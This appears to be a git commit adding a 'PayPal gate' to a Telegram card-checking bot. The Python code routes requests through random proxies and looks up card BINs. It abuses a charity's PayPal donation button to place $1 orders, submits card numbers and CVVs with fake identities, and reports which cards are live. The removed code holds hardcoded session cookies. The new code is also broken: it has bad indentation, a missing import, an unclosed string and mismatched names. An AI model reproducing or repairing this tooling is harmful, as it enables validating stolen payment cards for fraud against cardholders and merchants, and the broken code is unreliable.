997a850371aa44ccc98abc0281835fee8fecf92f
Darksi24 <yr84865@gmail.com>
2025-06-20 15:16:37 -0600

    PayPal Gate Added

---
+++ apis/PayPal.py
@@ -0,0 +1,145 @@
+import requests
+import random
+import json
+import time
+import base64
+from bs4 import BeautifulSoup
+from datetime import datetime, timedelta
+
+
+def stripe(username, numero, mes, ano, cvv): 
+  proxyies = "proxy.txt"
+  inicio = time.time()
+  
+  #BIN CHECKER
+  
+  bin = numero[:6]
+  
+  b_data = requests.get(f"https://bins.antipublic.cc/bins/{bin}").json()
+  
+  pais = b_data['country_name']
+  flag = b_data['country_flag']
+  bank = b_data['bank']
+  brand = b_data['brand']
+  level = b_data['level']
+  tipo = b_data['type']
+  
+
+  
+  
+  with open("proxy.txt", "r") as f:
+    proxy_list = [line.strip() for line in f if line.strip()]
+
+  proxy_raw = random.choice(proxy_list)
+  
+    
+  session = requests.Session()
+  proxie = {
+    "http": f"http://{proxy_raw}",
+    "https": f"http://{proxy_raw}"
+  }
+  
+  head = {
+
+        "Host": "www.paypal.com",
+
+        "referer": "https://onehealthworkforceacademies.org/",
+    }
+
+    r = session.post(
+        "https://www.paypal.com/smart/buttons?style.label=donate&style.layout=vertical&style.color=blue&style.shape=pill&style.tagline=false&style.menuPlacement=below&sdkVersion=5.0.390&components.0=buttons&locale.lang=en&locale.country=US&sdkMeta=eyJ1cmwiOiJodHRwczovL3d3dy5wYXlwYWwuY29tL3Nkay9qcz9jbGllbnQtaWQ9QWVuMjlWSEhpd2ljZWxsOWx6NGd4Yi1EaV9uNHhlUlkzWkdpd3l1UVk2bV9MUUlrTmNaMHh5ZEFnUE1NbmpFelFxTUNVblBtZ0ZHY2FIZmgmZW5hYmxlLWZ1bmRpbmc9dmVubW8mY3VycmVuY3k9VVNEIiwiYXR0cnMiOnsiZGF0YS1zZGstaW50ZWdyYXRpb24tc291cmNlIjoiYnV0dG9uLWZhY3RvcnkiLCJkYXRhLXVpZCI6InVpZF96aHV1bGxtaWxmaXVtY3djamhsZHpyb215bW91eHIifX0&clientID=Aen29VHHiwicell9lz4gxb-Di_n4xeRY3ZGiwyuQY6m_LQIkNcZ0xydAgPMMnjEzQqMCUnPmgFGcaHfh&sdkCorrelationID=f308033f5c550&storageID=uid_e775778837_mja6mzg6mty&sessionID=uid_1a87d97aea_mja6mzg6mty&buttonSessionID=uid_1e550b2bd0_mja6mzg6mty&env=production&buttonSize=small&fundingEligibility=eyJwYXlwYWwiOnsiZWxpZ2libGUiOnRydWUsInZhdWx0YWJsZSI6ZmFsc2V9LCJwYXlsYXRlciI6eyJlbGlnaWJsZSI6ZmFsc2UsInByb2R1Y3RzIjp7InBheUluMyI6eyJlbGlnaWJsZSI6ZmFsc2UsInZhcmlhbnQiOm51bGx9LCJwYXlJbjQiOnsiZWxpZ2libGUiOmZhbHNlLCJ2YXJpYW50IjpudWxsfSwicGF5bGF0ZXIiOnsiZWxpZ2libGUiOmZhbHNlLCJ2YXJpYW50IjpudWxsfX19LCJjYXJkIjp7ImVsaWdpYmxlIjp0cnVlLCJicmFuZGVkIjp0cnVlLCJpbnN0YWxsbWVudHMiOmZhbHNlLCJ2ZW5kb3JzIjp7InZpc2EiOnsiZWxpZ2libGUiOnRydWUsInZhdWx0YWJsZSI6dHJ1ZX0sIm1hc3RlcmNhcmQiOnsiZWxpZ2libGUiOnRydWUsInZhdWx0YWJsZSI6dHJ1ZX0sImFtZXgiOnsiZWxpZ2libGUiOnRydWUsInZhdWx0YWJsZSI6dHJ1ZX0sImRpc2NvdmVyIjp7ImVsaWdpYmxlIjpmYWxzZSwidmF1bHRhYmxlIjp0cnVlfSwiaGlwZXIiOnsiZWxpZ2libGUiOmZhbHNlLCJ2YXVsdGFibGUiOmZhbHNlfSwiZWxvIjp7ImVsaWdpYmxlIjpmYWxzZSwidmF1bHRhYmxlIjp0cnVlfSwiamNiIjp7ImVsaWdpYmxlIjpmYWxzZSwidmF1bHRhYmxlIjp0cnVlfX0sImd1ZXN0RW5hYmxlZCI6ZmFsc2V9LCJ2ZW5tbyI6eyJlbGlnaWJsZSI6ZmFsc2V9LCJpdGF1Ijp7ImVsaWdpYmxlIjpmYWxzZX0sImNyZWRpdCI6eyJlbGlnaWJsZSI6ZmFsc2V9LCJhcHBsZXBheSI6eyJlbGlnaWJsZSI6ZmFsc2V9LCJzZXBhIjp7ImVsaWdpYmxlIjpmYWxzZX0sImlkZWFsIjp7ImVsaWdpYmxlIjpmYWxzZX0sImJhbmNvbnRhY3QiOnsiZWxpZ2libGUiOmZhbHNlfSwiZ2lyb3BheSI6eyJlbGlnaWJsZSI6ZmFsc2V9LCJlcHMiOnsiZWxpZ2libGUiOmZhbHNlfSwic29mb3J0Ijp7ImVsaWdpYmxlIjpmYWxzZX0sIm15YmFuayI6eyJlbGlnaWJsZSI6ZmFsc2V9LCJwMjQiOnsiZWxpZ2libGUiOmZhbHNlfSwid2VjaGF0cGF5Ijp7ImVsaWdpYmxlIjpmYWxzZX0sInBheXUiOnsiZWxpZ2libGUiOmZhbHNlfSwiYmxpayI6eyJlbGlnaWJsZSI6ZmFsc2V9LCJ0cnVzdGx5Ijp7ImVsaWdpYmxlIjpmYWxzZX0sIm94eG8iOnsiZWxpZ2libGUiOmZhbHNlfSwiYm9sZXRvIjp7ImVsaWdpYmxlIjpmYWxzZX0sImJvbGV0b2JhbmNhcmlvIjp7ImVsaWdpYmxlIjpmYWxzZX0sIm1lcmNhZG9wYWdvIjp7ImVsaWdpYmxlIjpmYWxzZX0sIm11bHRpYmFuY28iOnsiZWxpZ2libGUiOmZhbHNlfSwic2F0aXNwYXkiOnsiZWxpZ2libGUiOmZhbHNlfSwicGFpZHkiOnsiZWxpZ2libGUiOmZhbHNlfX0&platform=mobile&experiment.enableVenmo=true&experiment.enableVenmoAppLabel=false&flow=purchase&currency=USD&intent=capture&commit=true&vault=false&enableFunding.0=venmo&renderedButtons.0=paypal&renderedButtons.1=card&debug=false&applePaySupport=false&supportsPopups=true&supportedNativeBrowser=true&allowBillingPayments=true&disableSetCookie=false",
+    headers=head)
+    token = r.text
+    match = re.search(r'"facilitatorAccessToken"\s*:\s*"([^"]+)"', token)
+    token = match.group(1)
+    print(token)
+    
+    head2 = {
+        
+
+        "content-type": "application/json",
+        "authorization": f"Bearer {token}",
+        "referer": "https://www.paypal.com/smart/buttons?style.label=donate&style.layout=vertical&style.color=blue&style.shape=pill&style.tagline=false&style.menuPlacement=below&sdkVersion=5.0.390&components.0=buttons&locale.lang=en&locale.country=US&sdkMeta=eyJ1cmwiOiJodHRwczovL3d3dy5wYXlwYWwuY29tL3Nkay9qcz9jbGllbnQtaWQ9QWVuMjlWSEhpd2ljZWxsOWx6NGd4Yi1EaV9uNHhlUlkzWkdpd3l1UVk2bV9MUUlrTmNaMHh5ZEFnUE1NbmpFelFxTUNVblBtZ0ZHY2FIZmgmZW5hYmxlLWZ1bmRpbmc9dmVubW8mY3VycmVuY3k9VVNEIiwiYXR0cnMiOnsiZGF0YS1zZGstaW50ZWdyYXRpb24tc291cmNlIjoiYnV0dG9uLWZhY3RvcnkiLCJkYXRhLXVpZCI6InVpZF96aHV1bGxtaWxmaXVtY3djamhsZHpyb215bW91eHIifX0&clientID=Aen29VHHiwicell9lz4gxb-Di_n4xeRY3ZGiwyuQY6m_LQIkNcZ0xydAgPMMnjEzQqMCUnPmgFGcaHfh&sdkCorrelationID=f308033f5c550&storageID=uid_d275d9fa3c_mja6mzy6mtg&sessionID=uid_1480210721_mja6mzy6mtk&buttonSessionID=uid_cabcbc1a43_mja6mzy6mtk&env=production&buttonSize=small&fundingEligibility=eyJwYXlwYWwiOnsiZWxpZ2libGUiOnRydWUsInZhdWx0YWJsZSI6ZmFsc2V9LCJwYXlsYXRlciI6eyJlbGlnaWJsZSI6ZmFsc2UsInByb2R1Y3RzIjp7InBheUluMyI6eyJlbGlnaWJsZSI6ZmFsc2UsInZhcmlhbnQiOm51bGx9LCJwYXlJbjQiOnsiZWxpZ2libGUiOmZhbHNlLCJ2YXJpYW50IjpudWxsfSwicGF5bGF0ZXIiOnsiZWxpZ2libGUiOmZhbHNlLCJ2YXJpYW50IjpudWxsfX19LCJjYXJkIjp7ImVsaWdpYmxlIjp0cnVlLCJicmFuZGVkIjp0cnVlLCJpbnN0YWxsbWVudHMiOmZhbHNlLCJ2ZW5kb3JzIjp7InZpc2EiOnsiZWxpZ2libGUiOnRydWUsInZhdWx0YWJsZSI6dHJ1ZX0sIm1hc3RlcmNhcmQiOnsiZWxpZ2libGUiOnRydWUsInZhdWx0YWJsZSI6dHJ1ZX0sImFtZXgiOnsiZWxpZ2libGUiOnRydWUsInZhdWx0YWJsZSI6dHJ1ZX0sImRpc2NvdmVyIjp7ImVsaWdpYmxlIjpmYWxzZSwidmF1bHRhYmxlIjp0cnVlfSwiaGlwZXIiOnsiZWxpZ2libGUiOmZhbHNlLCJ2YXVsdGFibGUiOmZhbHNlfSwiZWxvIjp7ImVsaWdpYmxlIjpmYWxzZSwidmF1bHRhYmxlIjp0cnVlfSwiamNiIjp7ImVsaWdpYmxlIjpmYWxzZSwidmF1bHRhYmxlIjp0cnVlfX0sImd1ZXN0RW5hYmxlZCI6ZmFsc2V9LCJ2ZW5tbyI6eyJlbGlnaWJsZSI6ZmFsc2V9LCJpdGF1Ijp7ImVsaWdpYmxlIjpmYWxzZX0sImNyZWRpdCI6eyJlbGlnaWJsZSI6ZmFsc2V9LCJhcHBsZXBheSI6eyJlbGlnaWJsZSI6ZmFsc2V9LCJzZXBhIjp7ImVsaWdpYmxlIjpmYWxzZX0sImlkZWFsIjp7ImVsaWdpYmxlIjpmYWxzZX0sImJhbmNvbnRhY3QiOnsiZWxpZ2libGUiOmZhbHNlfSwiZ2lyb3BheSI6eyJlbGlnaWJsZSI6ZmFsc2V9LCJlcHMiOnsiZWxpZ2libGUiOmZhbHNlfSwic29mb3J0Ijp7ImVsaWdpYmxlIjpmYWxzZX0sIm15YmFuayI6eyJlbGlnaWJsZSI6ZmFsc2V9LCJwMjQiOnsiZWxpZ2libGUiOmZhbHNlfSwid2VjaGF0cGF5Ijp7ImVsaWdpYmxlIjpmYWxzZX0sInBheXUiOnsiZWxpZ2libGUiOmZhbHNlfSwiYmxpayI6eyJlbGlnaWJsZSI6ZmFsc2V9LCJ0cnVzdGx5Ijp7ImVsaWdpYmxlIjpmYWxzZX0sIm94eG8iOnsiZWxpZ2libGUiOmZhbHNlfSwiYm9sZXRvIjp7ImVsaWdpYmxlIjpmYWxzZX0sImJvbGV0b2JhbmNhcmlvIjp7ImVsaWdpYmxlIjpmYWxzZX0sIm1lcmNhZG9wYWdvIjp7ImVsaWdpYmxlIjpmYWxzZX0sIm11bHRpYmFuY28iOnsiZWxpZ2libGUiOmZhbHNlfSwic2F0aXNwYXkiOnsiZWxpZ2libGUiOmZhbHNlfSwicGFpZHkiOnsiZWxpZ2libGUiOmZhbHNlfX0&platform=mobile&experiment.enableVenmo=true&experiment.enableVenmoAppLabel=false&flow=purchase&currency=USD&intent=capture&commit=true&vault=false&enableFunding.0=venmo&renderedButtons.0=paypal&renderedButtons.1=card&debug=false&applePaySupport=false&supportsPopups=true&supportedNativeBrowser=true&allowBillingPayments=true&disableSetCookie=false"
+    }
+    
+    post2 = '{"purchase_units":[{"amount":{"currency_code":"USD","value":"1","breakdown":{"item_total":{"currency_code":"USD","value":"1"}}},"items":[{"name":"item name","unit_amount":{"currency_code":"USD","value":"1"},"quantity":"1","category":"DONATION"}],"description":"OHWA Donation"}],"intent":"CAPTURE","application_context":{}}'
+    
+    r2 = session.post("https://www.paypal.com/v2/checkout/orders", headers=head2, data=post2)
+    id = r2.text
+    match = re.search(r'"id"\s*:\s*"([^"]+)"', id)
+    id_ = match.group(1)
+    
+    post3 = {
+
+        "query": f"\n        mutation payWithCard(\n            $token: String!\n            $card: CardInput!\n            $phoneNumber: String\n            $firstName: String\n            $lastName: String\n            $shippingAddress: AddressInput\n            $billingAddress: AddressInput\n            $email: String\n            $currencyConversionType: CheckoutCurrencyConversionType\n            $installmentTerm: Int\n        ) {{\n            approveGuestPaymentWithCreditCard(\n                token: $token\n                card: $card\n                phoneNumber: $phoneNumber\n                firstName: $firstName\n                lastName: $lastName\n                email: $email\n                shippingAddress: $shippingAddress\n                billingAddress: $billingAddress\n                currencyConversionType: $currencyConversionType\n                installmentTerm: $installmentTerm\n            ) {{\n                flags {{\n                    is3DSecureRequired\n                }}\n                cart {{\n                    intent\n                    cartId\n                    buyer {{\n                        userId\n                        auth {{\n                            accessToken\n                        }}\n                    }}\n                    returnUrl {{\n                        href\n                    }}\n                }}\n                paymentContingencies {{\n                    threeDomainSecure {{\n                        status\n                        method\n                        redirectUrl {{\n                            href\n                        }}\n                        parameter\n                    }}\n                }}\n            }}\n        }}\n    ",
+
+        "variables": {
+            "token": id_,
+            "card": {
+                "cardNumber": cc,
+                "expirationDate": f"{mes}/{ano}",
+                "postalCode": "10027",
+                "securityCode": cvv,
+            },
+            "phoneNumber": "19006318646,
+            "firstName": "Sachio",
+            "lastName": "YT",
+            "billingAddress": {
+                "givenName": "Sachio",
+                "familyName": "YT",
+                "line1": "118 W 132nd St",
+                "line2": None,
+             "city": "New York",
+             "state": "NY",
+                "postalCode": "10027",
+               "country": "US",
+            },
+            "shippingAddress": {
+                "givenName": "Sachio",
+               "familyName": "YT",
+               "line1": "118 W 132nd St",
+               "line2": None,
+              "city": "New York",
+              "state": "NY",
+              "postalCode": "10027",
+               "country": "US",
+           },
+           "email": "sachiopremiun@gmail.com",
+            "currencyConversionType": "PAYPAL",
+        },
+        "operationName": None,
+    }
+    
+    head3 = {
+
+     "content-type": "application/json",
+       "referer": f"https://www.paypal.com/smart/card-fields?sessionID=uid_1480210721_mja6mzy6mtk&buttonSessionID=uid_cabcbc1a43_mja6mzy6mtk&locale.x=en_US&commit=true&env=production&sdkMeta=eyJ1cmwiOiJodHRwczovL3d3dy5wYXlwYWwuY29tL3Nkay9qcz9jbGllbnQtaWQ9QWVuMjlWSEhpd2ljZWxsOWx6NGd4Yi1EaV9uNHhlUlkzWkdpd3l1UVk2bV9MUUlrTmNaMHh5ZEFnUE1NbmpFelFxTUNVblBtZ0ZHY2FIZmgmZW5hYmxlLWZ1bmRpbmc9dmVubW8mY3VycmVuY3k9VVNEIiwiYXR0cnMiOnsiZGF0YS1zZGstaW50ZWdyYXRpb24tc291cmNlIjoiYnV0dG9uLWZhY3RvcnkiLCJkYXRhLXVpZCI6InVpZF96aHV1bGxtaWxmaXVtY3djamhsZHpyb215bW91eHIifX0&disable-card=&token={id_}",
+    }
+    
+    r3 = session.post("https://www.paypal.com/graphql?fetch_credit_form_submit", headers=head3, json=post3, )
+    t3 = r3.text
+    
+    match = re.search(r'"message"\s*:\s*"([^"]+)"', t3)
+
+    match1 = re.search(r'"code"\s*:\s*"([^"]+)"', t3)
+    
+    msg = match.group(1)
+    code = match1.group(1)
+    
+    end = time.time()
+    tiempo = str(inicio - end)[1:5]
+
+    
+    return (
+    f"⋄ ︱ <b>CC</b>: {numero}|{mes}|{ano}|{cvv}\n"
+    f"⋄ ︱ <b>Status</b>: {msg}\n"
+    f"⋄ ︱ <b>Response</b>: {code}\n"
+    f"- - - - - - - - - - - - - - -\n"
+    f"⋄ ︱ <b>Country</b>: {pais} - {flag}\n"
+    f"⋄ ︱ <b>Bank</b>: {bank}\n"
+    f"⋄ ︱ <b>Type</b>: {brand} - {level} - {tipo} \n"
+    f"- - - - - - - - - - - - - - -\n"
+    f"⋄ ︱ <b>Gate</b>: Stripe Auth\n"
+    f"⋄ ︱ <b>Time</b>: {tiempo}\n"
+    f"⋄ ︱ <b>Checked By</b> : {username}\n"
+  )
--- cmds/PayPal.py
+++ cmds/PayPal.py
@@ -1,219 +1,28 @@
+# /cmds/stripe auth.py
 from aiogram import Router, types
 from aiogram.filters import Command
-import requests
+from apis.PayPal import paypal
+from utils.prefixs import CustomCommand
 
 router = Router()
 
-@router.message(Command("pp"))
-async def st_handler(msg: types.Message):
+@router.message(CustomCommand("pp"))
+async def stripe_handler(msg: types.Message):
     args = msg.text.split(" ", maxsplit=1)
     if len(args) < 2:
-        return await msg.answer(
-            "❌ Formato incorrecto.\n"
-            "Ejemplo: /pp 4111111111111111|12|2026|123"
-        )
+        return await msg.answer("❌ Formato inválido\nUsa: /pp numero|mes|año|cvv")
 
     try:
         numero, mes, ano, cvv = args[1].strip().split("|")
     except ValueError:
-        return await msg.answer(
-            "❌ Debes enviar los 4 datos separados por `|`",
-            parse_mode="Markdown"
-        )
+        return await msg.answer("❌ Debes enviar 4 datos separados por `|`", parse_mode="Markdown")
+    
+    user = msg.from_user
+    username = f"@{user.username}" if user.username else user.full_name
 
-    await msg.answer("🔄 Procesando...")
+    respue = await msg.answer("🔄 Procesando...")
 
-    try:
-        if numero.startswith("5"):
-            tipo = "MASTER_CARD"
-        elif numero.startswith("4"):
-            tipo = "VISA"
-        elif numero.startswith("3"):
-            tipo = "AMEX"  # o "JCB", según tu lógica
-        elif numero.startswith("6"):
-            tipo = "DISCOVER"
-        else:
-            tipo = "UNKNOWN"
+    # Llamar a la API
+    resultado = paypal(username, numero, mes, ano, cvv)
 
-
-        # ------------------ REQ 1: GraphQL mutation payWithCard ------------------
-        cookies = {
-            'enforce_policy': 'ccpa',
-            'cookie_check': 'yes',
-            'd_id': 'ab077583653a4cf4b23c51c99dd9255e1747451999479',
-            'datadome': 'iYAkUQaQ8z7H0lYZZGu~bt9W8zXuS0Ic5zWZZMRMmRAOt5rjm5l1xpDxZZMDs_pWS7zZJ5w61f9xZ0_0~ywCVw9Bp9g3kUbdM1lYeDaYIIrAA~QxcBFcJz9a6~lEsQFG',
-            'nsid': 's%3ADeYReZf8QMjXskwrP24hYROvFhJChZgL.ZKHe6X40dqNDBjl40N0lQrEo3H%2BpvlAUL1nxQAsgdoM',
-            'ts_c': 'vr%3D70ae65981940aa5a1023f2a2fe826b6c%26vt%3D509c5f841970a798285cadbbfd2f373e',
-            'cookie_prefs': 'T%3D0%2CP%3D1%2CF%3D1%2Ctype%3Dimplicit',
-            'l7_az': 'dcg16.slc',
-            'LANG': 'en_US%3BUS',
-            'rssk': 'd%7DC9%40%3A%3C9592%3A%3E%3B97%3Exqx%3E9wp9pm%7Dq%3F16',
-            'KHcl0EuY7AKSMgfvHl7J5E7hPtK': 'hKLin-hfAWz8cAy4Ain9wxOKflNSrOOlwgMQd89LxKkoWSg6Qven-x_ssl7CjlN-2Ejc2UQk16hBXhlr',
-            'ddi': 'EbfWe9YmOuLCOp1C3h3sQl-hMS0RfQcXUGkrs7kcBsfZ8Yu7DnV7v4q4GB8IvgBAA2zcAM6F7wycT3rhLvsuIGB15WD7y7YGUg5D2hdxzj00ysqg',
-            'sc_f': 'qihcsYKN-aVZn2i5BF9UEJPof-RywU9De_rJHTFhe60AOGAgazR-8XhxFyh-kox9eRxBCx1RCfxXDwtbhSJ0VTv6k7t_JwFyXz5rpW',
-            'ts': 'vreXpYrS%3D1780941295%26vteXpYrS%3D1749407095%26vr%3D70ae65981940aa5a1023f2a2fe826b6c%26vt%3D509c5f841970a798285cadbbfd2f373e%26vtyp%3Dreturn',
-            'tsrce': 'standardcardfields',
-            'x-pp-s': 'eyJ0IjoiMTc0OTQwNTI5NTgwNCIsImwiOiIwIiwibSI6IjAifQ',
-        }
-
-        headers = {
-            'authority': 'www.paypal.com',
-            'accept': '*/*',
-            'accept-language': 'es-CL,es-419;q=0.9,es;q=0.8',
-            'content-type': 'application/json',
-            # (la línea de cookie va comentada porque ya cargaste cookies aparte)
-            # 'cookie': 'enforce_policy=ccpa; cookie_check=yes; d_id=...; ...',
-            'origin': 'https://www.paypal.com',
-            'paypal-client-context': '8UA0911501956764B',
-            'paypal-client-metadata-id': '8UA0911501956764B',
-            'referer': (
-                'https://www.paypal.com/smart/card-fields?'
-                'sessionID=uid_c4deb6989a_mtc6nte6mtk&'
-                'buttonSessionID=uid_90427d3405_mtc6ntm6mzi&'
-                'locale.x=en_US&commit=true&hasShippingCallback=false&'
-                'env=production&country.x=US&sdkMeta='
-                'eyJ1cmwiOiJodHRwczovL3d3dy5wYXlwYWwuY29tL3Nkay9qcz9lbmFibGUt'
-                'ZnVuZGluZz12ZW5tbyZjbGllbnQtaWQ9QVVJbGtrdzY1bUg0b2lmcDZmWGtYd'
-                'XNQMXdBNVJybTNsLXNWbnpxRVlacENWUTY0dHdIRENGRlFCRnZCSExwQ09GRHE'
-                'za1hRNnhlTHd3djQmY3VycmVuY3k9RVVSJmxvY2FsZT1lbl9VUyZkaXNhYmxl'
-                'LWZ1bmRpbmc9Z2lyb3BheSUyQ3NlcGElMkNzb2ZvcnQiLCJhdHRycyI6eyJkYXRh'
-                'LXVpZCI6InVpZF9scGh0ZGRreXBsbWlndWlpc29icnBwbHRheXBsbnoifX0&'
-                'disable-card=&token=8UA0911501956764B'
-            ),
-            'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
-            'sec-ch-ua-mobile': '?1',
-            'sec-ch-ua-platform': '"Android"',
-            'sec-fetch-dest': 'empty',
-            'sec-fetch-mode': 'cors',
-            'sec-fetch-site': 'same-origin',
-            'user-agent': (
-                'Mozilla/5.0 (Linux; Android 10; K) '
-                'AppleWebKit/537.36 (KHTML, like Gecko) '
-                'Chrome/137.0.0.0 Mobile Safari/537.36'
-            ),
-            'x-app-name': 'standardcardfields',
-            'x-country': 'US',
-        }
-
-        query = """
-        mutation payWithCard(
-            $token: String!
-            $card: CardInput!
-            $phoneNumber: String
-            $firstName: String
-            $lastName: String
-            $shippingAddress: AddressInput
-            $billingAddress: AddressInput
-            $email: String
-            $currencyConversionType: CheckoutCurrencyConversionType
-            $installmentTerm: Int
-            $identityDocument: IdentityDocumentInput
-        ) {
-            approveGuestPaymentWithCreditCard(
-                token: $token
-                card: $card
-                phoneNumber: $phoneNumber
-                firstName: $firstName
-                lastName: $lastName
-                email: $email
-                shippingAddress: $shippingAddress
-                billingAddress: $billingAddress
-                currencyConversionType: $currencyConversionType
-                installmentTerm: $installmentTerm
-                identityDocument: $identityDocument
-            ) {
-                flags {
-                    is3DSecureRequired
-                }
-                cart {
-                    intent
-                    cartId
-                    buyer {
-                        userId
-                        auth {
-                            accessToken
-                        }
-                    }
-                    returnUrl {
-                        href
-                    }
-                }
-                paymentContingencies {
-                    threeDomainSecure {
-                        status
-                        method
-                        redirectUrl {
-                            href
-                        }
-                        parameter
-                    }
-                }
-            }
-        }
-        """
-
-        json_data = {
-            'query': query,
-            'variables': {
-                'token': '8UA0911501956764B',
-                'card': {
-                    'cardNumber': numero,
-                    'type': tipo,
-                    'expirationDate': f"{mes}/{ano}",
-                    'postalCode': '10010',
-                    'securityCode': cvv,
-                },
-                'phoneNumber': '19008007828',
-                'firstName': 'Luis',
-                'lastName': 'Pech',
-                'billingAddress': {
-                    'givenName': 'Luis',
-                    'familyName': 'Pech',
-                    'line1': None,
-                    'line2': None,
-                    'city': None,
-                    'state': None,
-                    'postalCode': '10010',
-                    'country': 'US',
-                },
-                'email': 'asdimandam@gmail.com',
-                'currencyConversionType': 'VENDOR',
-            },
-            'operationName': None,
-        }
-
-        response = requests.post(
-            'https://www.paypal.com/graphql?fetch_credit_form_submit',
-            cookies=cookies,
-            headers=headers,
-            json=json_data,
-            timeout=30
-        )
-
-        # Enviamos al usuario los primeros 400 caracteres de la respuesta
-        #texto = response.text
-        #resumen = texto[:400] + ("..." if len(texto) > 400 else "")
-
-        resp_json = response.json()
-
-        if "errors" in resp_json:
-        
-                code = resp_json["errors"][0]["data"][0].get("code", "UNKNOWN")
-                message = resp_json["errors"][0].get("message", "UNKNOWN")
-
-                texto = (
-                    "PayPal\n"
-                    "=≈=≈=≈=≈=≈=≈=≈=≈=≈=≈=\n"
-                    f"❌ *{numero}|{mes}|{ano}|{cvv}*\n"
-                    f"*Code:* `{code}`\n"
-                    f"*Message:* `{message}`\n"
-                    "=≈=≈=≈=≈=≈=≈=≈=≈=≈=≈="
-                )
-
-        await msg.answer(texto, parse_mode="Markdown")
-
-    except Exception as e:
-        await msg.answer(
-            f"❌ Error en el request:\n`{str(e)}`",
-            parse_mode="Markdown"
-        )
+    await respue.edit_text(resultado, parse_mode="HTML")
